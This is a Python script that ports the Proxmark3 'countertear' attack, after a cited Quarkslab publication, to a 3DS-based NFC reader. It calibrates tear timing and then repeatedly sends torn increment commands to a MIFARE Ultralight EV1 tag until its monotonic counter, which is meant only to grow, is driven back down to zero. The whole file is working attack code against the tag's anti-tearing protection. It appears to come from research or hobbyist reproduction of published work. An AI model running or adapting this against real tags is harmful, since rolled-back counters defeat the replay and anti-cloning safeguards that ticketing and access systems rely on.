# pm3 `hf mfu countertear` (Quarkslab, "RFID Monotonic Counter Anti-Tearing Defeated") on the 3DS:
# same phases and constants, delays in us after the frame end (pm3 counts from its TX end too).
#   countertear.py HOST CNT [BD_US]
import sys, time
from tlib import *

TX_END = 697
MAX, PREP, STUCK = 0xFFFFFF, 0x00FFFF, 6
BD_MIN, BD_MAX, BD_STEP, OFF00 = 2650, 3200, 5, 10

e = Ev1(sys.argv[1]); c = int(sys.argv[2])


def tincr(v, us):
    e.torn([0xA5, c] + list(v.to_bytes(3, 'little')) + [0], TX_END + us)


def norm():
    for _ in range(10):
        if e.tear_flag(c) in (0x00, 0xBD):
            return
        e.incr(c, 0)


def calibrate():
    for bd in range(BD_MIN, BD_MAX, BD_STEP):
        i = e.cnt(c)
        tincr(0, bd)
        t = e.tear_flag(c)
        e.incr(c, 0); e.incr(c, 0)
        f = e.cnt(c)
        print(f'cal {bd}: tear {t if t is None else hex(t)} {i} -> {f}', flush=True)
        if t == 0xBD and f == i:
            return bd
    raise SystemExit('calibration failed')


v, t = e.cnt(c), e.tear_flag(c)
print('counter', c, v, 'tear', hex(t))
norm()
bd = int(sys.argv[3]) if len(sys.argv) > 3 else calibrate()
d00 = bd - OFF00
print('BD', bd, '00', d00)
phase, n, t0 = 'dec', 0, time.time()
while True:
    v = e.cnt(c)
    if v is None:
        e.resel(); continue
    if v == 0:
        print(f'counter 0: done after {n} steps, {time.time() - t0:.0f} s'); break
    if v == STUCK:
        norm(); continue
    if phase == 'dec' and v <= PREP:
        e.incr(c, 0); e.incr(c, 0); phase = 'prep'; continue
    if phase == 'prep':
        if v < PREP:
            e.incr(c, PREP - v); e.incr(c, 0); continue
        phase = 'reset' if v == PREP else 'dec'; continue
    n += 1
    if phase == 'dec':
        tincr(0x100, bd); tincr(0, d00); tincr(0, bd); tincr(0, d00)
    else:
        tincr(1, bd); tincr(0, d00)
    norm()
    f = e.cnt(c)
    print(f'{phase} {n}: BD {bd} {v:06X} -> {f if f is None else f"{f:06X}"}', flush=True)
    if f is not None and phase == 'reset' and f > PREP:
        phase = 'dec'
    if f is not None and f == v:
        bd = min(bd + 1, BD_MAX)  # pm3 tune: no change -> later
    elif f is not None and f - v > 10:
        bd = max(bd - 1, BD_MIN)
    if n > 300:
        print('giving up'); break
